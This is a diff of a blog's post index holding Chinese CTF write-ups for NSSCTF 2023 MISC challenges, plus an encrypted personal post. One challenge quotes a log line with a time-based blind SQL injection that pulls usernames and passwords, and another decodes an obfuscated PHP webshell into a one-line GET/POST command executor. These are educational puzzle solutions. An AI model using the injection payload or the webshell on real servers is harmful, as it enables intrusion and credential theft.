-<h2 id="WebShell的利用"><a href="#WebShell的利用" class="headerlink" title="WebShell的利用"></a>WebShell的利用</h2><p><img src="https://s2.loli.net/2023/11/06/iLSEhst4XUwBl6o.png" alt="image.png"></p>
-<p>属实是被这一题干倒了，附件<code>index.php</code>尝试了很多次还是找不到头绪（还有后续，捂脸www）。</p>
-<p>只好求助于大佬们的WP了，呜呜呜。</p>
-<p>使用这一段PHP脚本来对WebShell脚本进行解密。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;eval(str_rot13(convert_uudecode(str_rot13(base64_decode(&#x27;此处省略题目文件中的编码内容&#x27;)))));&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">50</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base64/&quot;</span>,<span class="variable">$shell</span>))&#123;</span><br><span class="line">		<span class="variable">$tmp</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/eval/&quot;</span>,<span class="string">&quot;return &quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">		<span class="variable">$shell</span> = <span class="keyword">eval</span>(<span class="variable">$tmp</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$shell</span>;</span><br></pre></td></tr></table></figure>
-
-<p>使用PHPStudy运行后得到：<code>error_reporting(0);($_GET[&#39;7d67973a&#39;])($_POST[&#39;9fa3&#39;]);</code></p>
-<p>接下去开始常规操作，使用HackBar工具，对7d67973a变量GET传参，对9fa3变量POST传参。</p>
-<p><img src="https://s2.loli.net/2023/11/06/ZFbq2TmWALncYBX.png" alt="image.png"></p>
-<p>即可得到Flag为 <strong>flag{53f37ebd-a678-46cc-957b-fd6a3d5b8306}</strong> ，解题完成。</p>
-<p><em>PS. 写到这里突然顿悟了，其实只需要把<code>index.php</code>源码中的<code>eval</code>改为<code>echo</code>，反复运行重复修改即可（如图所示为最后一次的效果），这应该也就是上面那个脚本实现的功能。刚开始做的时候改了一次的效果不明显（文件长度实在太长了，以为没有变化，才会感觉没有头绪），所以一直没有往那个方向去想。这样一想的话，这一题其实也并不是特别难，以后还是要多比较一下解码前后的文件长度才行。</em></p>
-<p><img src="https://s2.loli.net/2023/11/06/2MfFaDeymwi6ptA.png" alt="image.png"></p>
-<h2 id="Jvav"><a href="#Jvav" class="headerlink" title="Jvav"></a>Jvav</h2><p>先看题目，提示说多看看题目名。根据题目名Jvav猜测会和Java有关，结合秘密藏在图片中，应该是隐写类型。</p>
-<p>查阅信息后得到 <strong>Java盲水印(BlindWaterMark)</strong> 这一知识点。</p>
-<p><a href="https://github.com/yxiaojian/blindwatermark">GitHub - Yxiaojian&#x2F;BlindWaterMark: Java盲水印</a></p>
-<p><img src="https://s2.loli.net/2023/11/06/NEhnxqkzMspKLZo.png" alt="image.png"></p>
-<p>在GitHub上搜索可以得到已编译的Java程序，运行即可得到Flag为 <strong>flag{3bb3c3a628a94c}</strong> ，解题完成。</p>
-<p><img src="https://s2.loli.net/2023/11/06/qrePNiy1u7l2dbg.png" alt="image.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF-WriteUp</tag>
       </tags>
   </entry>
   <entry>
@@ -350,5 +205,159 @@
       <tags>
         <tag>CTF-WriteUp</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>《年会不能停》：我不算理想主义，我只想无愧自己</title>
+    <url>/2024/02/08/Johnny-Keep-Walking/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="e75e024183dcde58821a588319ae2b1a7dcfad182087945551ac248e0616ef7c">10d79030e8222445804370796b90fca1b3149e2c2a0f36d6b4ea04e548758c2133cfffb0296fb6a1d3d40e129f22a5dadcc5126624c7b6b9f99b15a92a684cdae5484439173566f69261aaa62fafad55a7cde7f52998214d6f9e07200d111f100232667ab66f63878191c32dfb71d4cb2b098cda0d92c9548bd251f9cafd25899eee1818429cfb5da6e71f5dfebf62edc1c003d7f92e9e8274d060d29a6e616dcc0fa0db8810a4c8cc835b361cced4eaf0ad58547f4bcbbb6d17650e8b27de36457306795e03d25151a57e9a68eb6dc84c13f247ea4b5be4aafc195e63248a7cd6c0ceaa88286b1d5e4e2246310563676866bd2fc680efa7ead1724c67e9d46de197f2173d9e7c8bacee433b1cc1f81f8504603bd605131ca0f0da6a5d712a7ca76a249c5999ff89242c4464c47e0e74ee15c850ef68b2447243adab3a1ed6a978acb5b293f08e27100f7fb7f3ee34331fb7d01b16e308d8e3ddd91807a7e63079e2393d739808533cdf248f92a762eebd40e5393c1d07acf20d49b8f165fb0668e9b9c550e99dcd6f4c4d8e36c0051e092b24a1476e61eb6563dce64c928c4ad7cc310f98527ac3896b9c53c56b21d8d983ef37847726a4a041a04a62a8faed652baaac9432e8689b90e059f7460f489f06ed2b85ec1317d895b9f17d2c73429f68485579831635eb0fe8912cfb3224f81d1b190e036ed43831b1fa827d58fac100a8796e0ef816feb294feedb181126238313ec9d2803e67ccfc36dafe4958b389166a65e3f1193262ab9dc4110f83e36f5263de873a485112dfe6b34b4e2f0a42f6e80b067c1111c3a7d460b82bb4ba58370304d8bc8d005273b04d50785c43bf014fabe76daca3163841ddafe1e2cc38e40e3202bf1ae58ef47cb67dd10070a123600f395a2961e72de7176b046a01fc5265f1704be8052658e716a77175bd14cad8f0a8457d156f2f30adb17a6111772afa10072657695f802cb6ebed655aea538f99e0f826d456f6a293b4fbbdcbb77cae22a51e5c0af361bb85f8bce72fcc8edb3f0b5acef2f17a408df252a2049912cb872b2ad168b6ef41a629496fa33971209957f56b517b5739d3c44bfbc1fe019e2e8f2018473e1f92392878888f457927bdfb764bcc30e81c1b4780ee4f5b6ba00b3c0537ae63955b873d5ff0068dc23d65d160f0f130cf72a3f5f049801cd5f41591f0d77c1a6f15837e450ae0d95bcba9e5eb0244d841e0a8e809daed4df25c211f5cbbb247361a6feb8a28ebd13fae7378b4194c8ac8ce2cf21d006382cc6a89a073fd373750802cd2c0b2bb2d005ca89fd020aacbafafbe97e4c41bee65e9582915d2d6baae640b72c0b35dc86be773ae9353cee687caa0c149d7ba10cff56cbcf39a158823436ab8a1cc31b70534a9f71fe2b4b5e4c5e5eb3ee9f923d485e19fdb955950697b4bcd60fa487bdf24f4636cae6c7b06d9b9b931fb14eea3861d429553d45f8f3cc04f854b80d1dbba1a48718ec877cec1db2a27fb1bb95bb73baf199755d537970f1b88ecca3467bceb189775531bc50e174e8d793073250e8aa10269c201cd1ad58e0423f2ac7132043d833fd17350e389e33e937704d023b7496095f24c976a15559d43312785befd60c105e3019ebfcebd2e91de9e382041dbe5d4cee8945f20661d38b8c8dc1f45d5510aa823f6364204011ef9692543697e1784412705e2dd947bea1fe913cfd05b81b8330fc744aba0a552fe1ff06e2f6fd92761a7dfda929f436d16a927a9b34a6b964e90d64f7e9d7eb38465ed1ffc2d99947f994da9a4b4d74cde0588e0707d1ff3b48b118efbf97f24f90be1905cdbcb483bb62108ad2d10e8689b5fabadd1cc67dd946c6b364b0649677ba08be662bc2876794513650950169b323efd29186a0b6fd1776ebba0aaff32f17b2a53957602aec56baf5bb302255cd1576357fc5bd5e397b3924c4e562b6b499c696081328e9050cc053eb70e0371caabe007afa4c4c64415aee9fe3d8b46123672eec0a295cf166a1d868a20dea597eda9030db079de3d33aaf918e2ea68545dc6de7c9648712600f7417f933f0effb56e7cf9c3ca5c7dba898c317a4ab28be325bdace50d2ebb984358200b3ff940b573a89205b66486f91b066046e2ec941ef686a1f91972ef7f119982abda795d7eaa44eb60a77649d5103ee502586f0e33e8c980433cd1152c589935b8ee0c514ff9ca048472ab60f10607636a59370626bfa8cbeee15a9a596e3a5b67c0e44369bc7a94fc2552dd59d3c0173234119daeea2f39cdf50978124ee5bdd1b735f388d73d18b332a6fd45de63de0312141f0d80d5aac4d811f76ecaef5a60923b6c04d11702dea0ef7d8f956dda380c786ff4ba598ddeb04473139fabb3eb2fcb62e61655332b453c2953cbdc2b9d7b739105b5daaca021a7e445f93291e5357a9f275b43b00d34f115c0e9c77934b4bc1045806f160bc542de3f2e5b870aece094841e858695d9219f4f42d5fc6aea98fdb4b107d53f2b76074e6b037b2e49457b8709f46c50a663a0f080a46ce3cdac406eca742bf1e26cc7cf5bd43e54db714d647e7ec2bb1b91b848334e433d02b9f43cff91386d5381a18e7cee2de79cf30cf0b554f500d6b74486e7724abc755621f363c2951c581c0928d3fe63617fc4efba9a2a8691ede61c09a5a2ab1a84c38507d5bd2590ba5348b89d6d3862ced9961c7dfd0f835660495f993b5a5216cf1014b17c6ede523ed3b4e5e6020f02326b074bd359bbcd7adcb54d38055609cdedcca715be1aac760a73b012ed4a9f4e2a49f817faaaad2648e80201c1783947eb3a41e3479c1ef948c0735b06167e9cdf6b0b10472ddbd8b8c07b493a62653a208bfe6b5836190ddff1998c2df60d920aa4b73aa0355aeeb6a183ae22c1c851330e210c7f279281f5ea8ca5c008c60b5da3dc90dff3931b01a34d890da70b2a0d4744a4eeedccecfca2b2567e2e9d6344993d048bf23ece9acf98abe6f57c0753746cb6161fd72bdbb9bf5448b2c336acc3fa4aebccca3ae67064f73e5f687983dee1c0cbbc9183b04b16c057f8fd5b59e434edcc280eaa322dcded4a5f4dbfe5e6ae810592797caa801ec2663cab9dcd3f028433cf0d8a146f76a23a651778fee3f14d93ac52f2789caba09812f53d8376f500d5a9b20eebfb62979706ac3b704655a57468496732d877c21d0fe3af1d65e3a993dd6b18ac3010f1418abbbfa15054dd85385dc8fb167a2917d90506688ae6b32f6373da72c1bc4697513b7afa3e699c5d22f30fc46c5c097adaa48c49a7f1099f4acbade8f49daa76c4ed4459d191fead3297b9a95bbeb8bd3cfe11576080b8aac84336e91e8b5407ebf097b0b08aaa39b7f2c63c92efab78afdb94684836db74d2c5f96a0b9396995f18da434896080ca0a2982c59b5b6f6e79b964380dbbb30682eabd47b77092e42a920e1b7c0d492d3f23ac9406aa6f1d5c1f9aba2d2e33a551626cbf2d0e74a4542450ece767928567741eecd3d034017aeeaddb403834ff834c886ba9a626197c108f105167203b2e323a7bb2e8d5e72f84766bc048104c264866565d5048c6d8440431e62dd3ce2a72e8d0a854e6bc1929a7404f156f30e9a3da8a18a7cbfb5fbb530d8efb0869074ae12ce04bc607f9daa64e3d79b6239a0defc8eb091a05d394164fbdc5410f5838dd6d2d877716e24571a6f6f5d7d5ce3112518b2ab4d61da13c4aaa31a9be7fd2280527541754cf71d4c9b731f567a6334863c8a58083f0d801a3328717e3b839bb55972cdfe17695fa0dd7ab3cda340f234ca1a8bba6f0618774c914a538664e57d34c87e4f0be9af6f6153008cb9d744a76add280b1d1a99e9605b248a3f790ac4acadb8a23080f8852f7f3de35532207cef745076702d8542a03e7ebd688ca72ca8ae3b3394cd3f50e05165012893c25f78331ec4b521d11bbc1f805f5ffb9464f31ec7e9e154856a21c4e3b678f6f770020d0fe2cccba59806d107a0f191794e679f4e3aa329631789fbb0caf27c5fd3a3011483712698814d91ca63149d94fb818d32b70fe163ab1af8608a1da950e82bd0573ee38a6ba525fba9fb8db7618ddcfb05ee3cc2cbbfbe3f9dc26bb11e14ec93f1872a07817304361c7a7e4b775afd153c7545d226baa665bd8f1df4f1601d7a880e880308d3fe6484b46f7da74c3b06e3a0d58ac0419ea37d4a54d32e7826d380d9f04a71f9e46404e8aeb323ef7807af4bbfc9b28277f139d5bc354dc9c17745cae8875af2f68711f6ca2c73aedddb5bd33fcdd25fcd777bfc0dbcd251f316ac2bf0e3cd07f1fa70bc6d343fec87be42c43e239d65caa71a066779dbaa38d10010d3a4fde5f141527ea3014e4d8ce76cf36ca9cdfe94b52132661a8d4591a423b61b4250aeefe4e01f0b8e30f199066edaa57c25be3a0255f4813af2f4d832f032b38b20440c491164ec2c27bf79867267237e034b901a277d00a568692658491af2693a436e115b52ac9d6ab4bf3a39e98fa99b2ec2d9902ea19f994e33fe646a12f8b90eb51276c835a37b105b398ae1328873486eab9b65d465c1c6a4e3802342115c433fb3fcd2913c3a8a2a864815b528c7b3275be8a988354569e406358f27dc75625cc5d2f77f3b79f056b0c69c06c5c8a42d7e7d5899d79b6878d1940dce2ea715857f77966d08b9ed778a5cc139d11964a4acc3007c3c1679bf33309e85f4a601bc70ff3b2330751e0b0329f854c27f7080f638b7e89bbf42060bfdecf1f5237dc867693e5faa6fc551ff254eaba3f6611165c67fca8ed773ee4d7279a010004813d18cfaf4ace74bfdc76c49fbf10ed2ec749b954fa0017f6ebd9fc3b1d6ab13880d77b2f1cd4faa62bdc13f700921b1a2e4c082e2e483bc9a57a3519c21d7dfef6c2c7eadddc9b2ac98203289dc4d8c77fd36f06568ea3d8433eb461982f51cd66410935f0b3b31d62566b36bf40e5bfba349c1e40848719924a90c4ee20becf65086423673dad41999099f365b7bbf9e98fb9716a11b26e989db8bdbfbaa87417349c903d9deffeb3e609a1106d0e33fd2e1ab692c440bbe43ecf691e7ae0de9866cb332c282f7311b4ec66e13a7e0f0fe3e905ae57884e360ccedc877cbbb7d9234240fed07782bc484b709ba12a8584cad9665a1ca5a6b062a7e878f7be7491b78831cf76aadf7397e0b06b094dc906386ea4418d694824567604d309a80da9df23472645da1eea1c7260b01750a6991c6198c959b855d28b83059e7819144759921560371a9d0bc2028ce7d0936a94e960bb93ba94b226c9cb7586c5644286e4daf4f9f618cd1141afb16125f70a4c11b3bc79e450cd2ee98ef8bd5721ab05ec4674be36097dc9dbae824ed34f22732789cc99b29048352aaff7971b1b047af6669ca45812418fe8dc67a341ef7b5f914fd803bfcb546262423dff96fe6418be422f889d9464985c1b2f4d523a800dafa367ce9efa24acd11515c0cf8a59fe33462ae12e9b787f45cfaaa23b684be3a4b402e103e4816466d70faeea64ade74bb7a45094262c2f5e03704451a221452de0f95182e4f561ab967fd4ff6c6e937475568437995ad811cb18bf8bef68014e0e9ecb2148820e18f9bc39d7b6f2e19226f16a7d27d89c14a1547c0f5a5d6ca25fd7b16a1ee49aa22e43328eb5eb2ac349b1913b5c521e633b06851aff13cdfaa0d975018d202c57f6aa38b568b0f49a98ab1df68f6d94b6bcdca291507d97ddd90ce56002de16c3910f548f7ee03e9c764499878d9f026fef5b76e97756a794fd345583c5178c50b6c0fa9e9bff293358ce61729beb2816241fcf4edf284a384326bee4bca657a5a353a53be30eb4607d02d1fee67b98df4ffae8653bd814926f76d4a369dd4a8b350a617273a206ffab7aa27ddf31f46925c591b5ba5fb1ad8624c7b9080c1fd5aa38174b90f4d4712d33b6383421440b824e175a5ad7d4d2942ee42d0ccb3f6cc89ba2f1b60c98d1e68c897683c19a54d9da90edb287beadda8545163dddec6e54b44f72a2f0b4a1086d685c36a99b22d45cf64e5aae9f7c58ebe77a7ce5c0290e6e1a7baddeaffc2c2021d170fc0ed2554a345c6d5cb1be8f2681a54a9688493c017be02ad8506671490af3bfbf970e81fcf6ae0a0420a13c0fb2f9d4d5fca4a492ca8fcde32b7e9f830ccf7f3e76fc6aad41b6fa04d8cffab7685357f5afdf1527f3cae68ee1d81ae395e7d1da131e9d2b2a881d5a6048256649c153a14095016541baee6990d0950f01ffccbc7ec311568c7b7d75e16079cadc95aa5d3639c0033a87d22ccc4633e60df2dd5786137b5175e6b515b725af76503c09724ab9e4b2d817a2c895e2cbb65f6e1ebabcac02c28f71ce99cd9e197b34f7dc395bf66d23b1b0446f0cecc848eea0b184b32a4c773dff05f1dccd58a292e9267b70ee2283ee434c7d120064801444f25a7fe56af27a2b0bf6aee7eb5d2dfea102d3243ec86c3991738a69eda100a81faa44ce1cc7e32d19c9fa9f212c4f0aa25df12570084c781426455e9e74d429e83da081015199386a1b7f16793df5a0f56990f0202063f1995ecb95e198bbc0af1ba3f163212300f7190fb3f4b437c1880374e3a08db403dd85d8d4d2b5841084fb94455d2e87dbde5b3d18147b699eebd42b9c436db2f56ec7852dbefbb0da081b7da5d19d56cf6bb275fd8304d225c388676fe8f25530b00466560112ab27a9116a56523ab79c1830d86e39c85c322406a6c4f907757a213480ba864b4dffbd858eae0a7d031707f2137d99639ac65f1b32cbe7ef32661f9e82e102409b10c14ec05c53aec47d1400d1c1c8241b25dc346c8d10761bb530f11151ce22482e2f90f0c1377de06c0a2ffe4ad89036464bdd775b0e08c342590f5491a6045c0e9a3d305dbb5c6321c115acfa50f61a58fde5a442069ee26b5817c0b9da640957d2583b3bd6138313cf41175fde21881c98de604aa8da2f88c9f1b7c690eb3a40de746a4b3f86d7a0066a56d730ea1bd41e357ae93df376270393f795c53784512e0740c6428e6bb58e027eefdf8a4afdb0baecabb4637640a27322321765a3aeab17d6cf968ea459f8b69c8f7afbdd6e2c619b5b94765647038e1bdc1889e8a68cb0608e1883b9fcda9a252e746b9b522b928e857ad73ae97a6a45e7dd64fd3c8106e4c0008325f36c104c2c481f681895ddfac6c71c11fac1daefe0c010e85bca53a48dc67dff0f843159289aa01fec19c4ab0c8d4e0c1729c65805f2e1456b757300086200c113d98f307bc95236b459eeb19860e58044ec76121e996d4ed5c3e5d6bf2a360e3efbba9e9ca465726701db4d54e845c85e1e609816c9aa5d3f028a5ae435bf8574d19059dbb657f0fa6346d09de81adf01ac0704816d194a1bce5d6e1fccbd334cb756feb9e71c75dd8f0f3ad3c01e125c48223db55f64b52596870a209a50117936fe64c78661798f6275aec4c0767dfbdbf19a6a77459fd369152a16fdc1d20693736cbccec8dc338811cdea10a047d40bab62f6432b56ca04408ef8e37496caa2844d978a48395f1c58fc8bb4c8cb7a0e1e82ebaa3f87328665274efdd85a1a9360eb32c06440567b7de98047254414ee37d1872c34642cac66118ced0c71448e96355d7cbfca387b11ca58cb505e106591845c06ed63a12eccf41e8711429efb60c475e053d29594b61d2999f0e73a53c6df389149d5781be3c091f4d640f6024238ec54b3873c77dfa0e3b3aa0229b61c6acb95a1391bcba3b313ac2e35bf18c79e31101b5e7a568e886171bd968d6640406517166c5d23218f314eac23c5fbf442dd83579c570110932a251e6a59d7a6cf5f3e0dce36b258a49ef45cded4f2fce30976cdd7298002104aad4b9c77b5441b5cbda33e5b47109a3d8d6b393c0348b5a37bcf3fa1ef4c7ee5f1196b730477f40d63d6080b3c34bc71fc1ba1a892cd1d3b02734e4c8b37aacb0086679662f1d4931e1f7b7b908c9632f583a8467f4ad8a60cf142f9a646292d8e6a294aebfda195a4af77b9ceca3355158a7a087713ecaba897ea5431597e7ef3ac243771acdbd3b46ae49cbba46e188ccd8de4647986a04cf6032258d7444358575ffea7fb2ed8d878b1b8d9f9d768e48b655a703dd8d931006841615d063d72a86febc824f17e731e1dbb95bc7d18ebd0e303b77b66d5f25434afd3479f6b8bdb9a9</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>日常</category>
+      </categories>
+      <tags>
+        <tag>影视</tag>
+        <tag>思想</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NSSCTF 2023 WriteUp</title>
+    <url>/2023/11/13/NSSCTF-2023-WriteUp/</url>
+    <content><![CDATA[<h1 id="WEEK1-MISC"><a href="#WEEK1-MISC" class="headerlink" title="WEEK1|MISC"></a>WEEK1|MISC</h1><h2 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h2><p>先看题目，为编码转换类型。</p>
+<p><img src="https://s2.loli.net/2023/10/31/qAwKjlP3zEBtQVC.png" alt="image.png"></p>
+<p>下载附件得到一串base类型的编码： </p>
+<p><code>M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=</code></p>
+<p>尝试之后得到解码路径为：base32 - base58 - base64。</p>
+<p>得到Flag为 <strong>flag{Base_15_S0_Easy_^_^}</strong> ，解题完成。</p>
+<h2 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h2><p>先看题目，得到信息为图片隐写类型。</p>
+<p><img src="https://s2.loli.net/2023/10/31/fDgFKQn7HdN1BV4.png" alt="image.png"></p>
+<p>下载附件后得到一个二维码，直接扫码无Flag信息。通过StegSolve - Data Extract打开，调整为以下设置。即可得到Flag为 <strong>flag{W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece}</strong> ，解题完成。</p>
+<p><img src="https://s2.loli.net/2023/10/31/QqLB2W5dSrex8RJ.png" alt="image.png"></p>
+<h2 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h2><p>先看题目，发现信息有WireShark，分析需要进行流量分析。</p>
+<p><img src="https://s2.loli.net/2023/10/31/9XaWKcRD8qvz3dS.png" alt="image.png"></p>
+<p>附件下载完成后通过WireShark工具打开。</p>
+<p><img src="https://s2.loli.net/2023/10/31/9paetzuHDnT8yjP.png" alt="image.png"></p>
+<p>打开“文件-导出对象-HTTP…”选项，尝试用文件大小排序。</p>
+<p><img src="https://s2.loli.net/2023/10/31/SbiduphUJZqm1ea.png" alt="image.png"></p>
+<p>大部分大小为271bytes的为HTTP-404，发现一个文件的文件名带有base64字样。</p>
+<p><img src="https://s2.loli.net/2023/10/31/c9GgnQbCWrkseFI.png" alt="image.png"></p>
+<p>将文本导出后使用base64解码，得到Flag为 <strong>flag{Wri35h4rk_1s_u53ful_b72a609537e6}</strong> ，解题完成。</p>
+<h2 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h2><p>先看题目，得到信息：多层压缩包，猜测存在密码。</p>
+<p><img src="https://s2.loli.net/2023/10/31/2Or6ivJqHDg1Mxz.png" alt="image.png"></p>
+<p>下载附件，得到一个不带后缀名的文件，使用wxMEdit工具打开，发现二进制源码符合ZIP压缩文件的特性，但缺少ZIP头文件，因此第一步，修改头文件为<code>504B0304</code>；同时在源码最后发现一串base64 编码的信息，转码得到：<code>I like six-digit numbers because they are very concise and easy to remember.</code>猜测有一层压缩包的密码为6位数字。</p>
+<p>解压第一层压缩包得到一个<code>flag.zip</code>文件，直接解压提示文件损坏，继续使用wxMEdit打开。因为前面得到信息有一层压缩包带密码。因此通过源码加密数据0900标记在压缩包的相应位置，至此即可正常打开第二层压缩包。</p>
+<p>最后使用ARCHPR爆破压缩包密码，打开文本即可得到Flag为 <strong>flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc}</strong> ，解题完成。</p>
+<p><img src="https://s2.loli.net/2023/10/31/k5oPKlbQ3eLWMHp.png" alt="image.png"></p>
+<h2 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h2><p>先看题目，只有信息：空白格。</p>
+<p><img src="https://s2.loli.net/2023/10/31/4LQdIRv7UzMGACt.png" alt="image.png"></p>
+<p>下载附件后，得到一个文本文档，内容全部为空格和TAB键，一开始不清楚具体的编码类型。</p>
+<p>查询博客后得到，“空白格编码”。</p>
+<blockquote>
+<p><strong>WhiteSpace</strong>，是一种只用空白字符（空格，TAB和回车）编程的语言，而其它可见字符统统为注释。</p>
+<p>解码网站：<a href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a></p>
+</blockquote>
+<p>将整个文档内容复制到网站中解码，即可得到Flag为 <strong>flag{w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04}</strong> ，解题完成。</p>
+<p><img src="https://s2.loli.net/2023/10/31/nLVqkMh5FKmQiZJ.png" alt="image.png"></p>
+<h2 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h2><p><img src="https://s2.loli.net/2023/10/31/wmUgJXP1OMZqv8h.png" alt="image.png"></p>
+<p>下载附件之后，不确定图片隐写的方式，所以通过现有的工具一个个尝试。</p>
+<p>最后使用SilentEye工具成功得到Flag为 <strong>flag{R0ck1ng_y0u_63b0dc13a591}</strong> ，解题完成。</p>
+<p><img src="https://s2.loli.net/2023/10/31/uM6htFvlAgGywNS.png" alt="image.png"></p>
+<h1 id="WEEK2-MISC"><a href="#WEEK2-MISC" class="headerlink" title="WEEK2|MISC"></a>WEEK2|MISC</h1><h2 id="新建Word文档"><a href="#新建Word文档" class="headerlink" title="新建Word文档"></a>新建Word文档</h2><p>先看题目，信息有：Word文档。</p>
+<p><img src="https://s2.loli.net/2023/11/02/NcYhf1H8mbKDqFd.png" alt="image.png"></p>
+<p>下载附件后，直接转为ZIP压缩包格式，打开<code>document.xml</code>文件，找到编码信息。</p>
+<p>信息以”新佛曰“开头，与佛论禅密码格式开头为”佛曰“，因此推测新佛曰是一个编码提示。</p>
+<p>通过在线的新约佛论禅解码器，即可得到Flag为 <strong>flag{Th1s_F0_1s_s00_Cyp3r_495586e3df3a}</strong> ，解题完成。</p>
+<p><img src="https://s2.loli.net/2023/11/02/l9TViHsuNhvP1G8.png" alt="image.png"></p>
+<h2 id="永不消逝的电波"><a href="#永不消逝的电波" class="headerlink" title="永不消逝的电波"></a>永不消逝的电波</h2><p>先看题目，信息有：有节奏的声音，推测频谱图中会有摩斯电码。</p>
+<p><img src="https://s2.loli.net/2023/11/02/Gph9nJRsWFyPDbg.png" alt="image.png"></p>
+<p>下载附件后，用Audacity工具打开。将频谱图按照长短转换为摩斯电码格式，解码后即可得到Flag为 <strong>flag{thebestctferisyou}</strong> ，解题完成。</p>
+<p><img src="https://s2.loli.net/2023/11/02/GnsLmkujH91INqd.png" alt="image.png"></p>
+<h2 id="1-序章"><a href="#1-序章" class="headerlink" title="1-序章"></a>1-序章</h2><p>先看题目，很好，进入连续剧模式了……</p>
+<p><img src="https://s2.loli.net/2023/11/02/9lqbdtJBFNHWwC2.png" alt="image.png"></p>
+<p>下载附件后得到一个日志文件，示例数据为：</p>
+<p><code>172.17.0.1 - - [20/Aug/2023:00:08:21 +0800] &quot;GET /app/action/edit_sell.php?pid%5B0%5D=-1%20or%20if(ascii(substr((select%20group_concat(username,password)%20from%20user),1,1))=40,sleep(1),1)--+&amp;totalPrice=0 HTTP/1.1&quot; 500 353 &quot;-&quot; &quot;python-requests/2.28.2&quot;</code></p>
+<p>对比其他行数据可以发现：<code>group_concat</code>之后的数据是不断变化的，表明这里的SQL盲注应该是依次遍历每一位的值，从ASCII码为40的字符开始，直到找到符合的字符就切换到下一个索引位的字符。但是不太确定最终找到的字符是临界的行数据或是下一个ASCII码。</p>
+<p>由于数据量过大，利用Python脚本实现（摸鱼式写法hhh）：</p>
+<p><img src="https://s2.loli.net/2023/11/06/LI8EexvtOfyDqWH.png" alt="image.png"></p>
+<p>大括号内的信息即为Flag，得到Flag为 <strong>flag{just_w4rm_up_s0_you_n3ed_h4rder_6026cd32}</strong> ，解题完成。</p>
+<h2 id="base"><a href="#base" class="headerlink" title="base!"></a>base!</h2><p>先看题目，信息有base编码。下载附件后，发现直接进行base转码会出问题，结合之前刷到的题猜测存在base64隐写。</p>
+<p><img src="https://s2.loli.net/2023/11/03/kcHQMNbs14RGeoE.png" alt="image.png"></p>
+<p>使用Python脚本进行解码，得到一串编码，最后确定是base58编码格式。</p>
+<p>即可得到Flag为 <strong>flag{b4se_1s_4_g0od_c0d3}</strong> ，解题完成。</p>
+<p><img src="https://s2.loli.net/2023/11/03/jy3CKmIESxR1n6i.png" alt="image.png"></p>
+<h2 id="WebShell的利用"><a href="#WebShell的利用" class="headerlink" title="WebShell的利用"></a>WebShell的利用</h2><p><img src="https://s2.loli.net/2023/11/06/iLSEhst4XUwBl6o.png" alt="image.png"></p>
+<p>属实是被这一题干倒了，附件<code>index.php</code>尝试了很多次还是找不到头绪（还有后续，捂脸www）。</p>
+<p>只好求助于大佬们的WP了，呜呜呜。</p>
+<p>使用这一段PHP脚本来对WebShell脚本进行解密。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;eval(str_rot13(convert_uudecode(str_rot13(base64_decode(&#x27;此处省略题目文件中的编码内容&#x27;)))));&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">50</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base64/&quot;</span>,<span class="variable">$shell</span>))&#123;</span><br><span class="line">		<span class="variable">$tmp</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/eval/&quot;</span>,<span class="string">&quot;return &quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">		<span class="variable">$shell</span> = <span class="keyword">eval</span>(<span class="variable">$tmp</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span 